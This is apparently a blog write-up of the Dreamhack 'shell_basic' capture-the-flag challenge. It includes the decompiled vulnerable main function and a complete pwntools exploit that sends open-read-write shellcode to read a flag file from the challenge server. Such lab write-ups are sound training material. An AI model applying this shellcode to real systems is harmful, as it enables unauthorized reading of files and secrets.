+++
date = '2026-05-05'
draft = false
title = 'Dreamhack shell_basic Writeup'
ShowToc = true
tags = ["Dreamhack", "pwn"]
+++

## Challenge overview

입력한 셸코드를 실행하는 프로그램이 서비스로 등록되어 작동하고 있습니다.

main 함수가 아닌 다른 함수들은 execve, execveat 시스템 콜을 사용하지 못하도록 하며, 풀이와 관련이 없는 함수입니다.

flag 파일의 위치와 이름은 /home/shell_basic/flag_name_is_loooooong입니다.
감 잡기 어려우신 분들은 아래 코드를 가지고 먼저 연습해보세요!

플래그 형식은 DH{...} 입니다. DH{와 }도 모두 포함하여 인증해야 합니다

---

This is actually my first actual orw challenge, in which I genuinely know what is happening.

This came alongside the amazing shellcode course from Dreamhack which you should totally check out.

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  void *buf; // [rsp+10h] [rbp-10h]

  buf = mmap(0, 0x1000u, 7, 34, -1, 0);
  init(0);
  banned_execve(0);
  printf("shellcode: ");
  read(0, buf, 0x1000u);
  return ((int (__fastcall *)(_QWORD))buf)(0);
}
```

## Identifying the vulnerabilities

So, no execve, no problem! I won't explain this too much, if you want more details just check [this blog post I made out](https://irinasusca.github.io/writeup-blog/posts/pwn/#orw).


![challenge-screenshot](flag.png#center)


## The exploit

```python
from pwn import *
elf = ELF('/home/kali/Downloads/dreamhack/shell_basic/shell_basic')

context.arch = 'amd64'
cyberedu = 'host3.dreamhack.games:21826'

ip, port = cyberedu.split(':')
port = int(port)

if args.REMOTE:
    p = remote(ip, port)
else:
    p = elf.process()
    
p.recvuntil(b": ")

#string of file is /home/shell_basic/flag_name_is_loooooong
print(len("/home/shell_basic/flag_name_is_loooooong"))

shellcode_open = asm('''
push 0x0
mov rax, 0x676e6f6f6f6f6f6f
push rax
mov rax, 0x6c5f73695f656d61
push rax
mov rax, 0x6e5f67616c662f63
push rax
mov rax, 0x697361625f6c6c65
push rax
mov rax, 0x68732f656d6f682f
push rax

mov rdi, rsp
xor rsi, rsi
xor rdx, rdx

mov rax, 2
syscall
''')

shellcode_read = asm('''
mov rdi, rax
sub rsp, 0x30
mov rsi, rsp
mov rdx, 0x30

mov rax, 0
syscall
''')

#rsi alrdy rsp, rdx alrdy 0x30
shellcode_write = asm('''
mov rdi, 1

mov rax, 1
syscall
''')

p.send(shellcode_open + shellcode_read + shellcode_write)
p.interactive()
```

---

As always, the full code can be found on my GitHub 
**[here](https://github.com/irinasusca/ctf-writeups/blob/main/dreamhack/shell_basic.py)**.
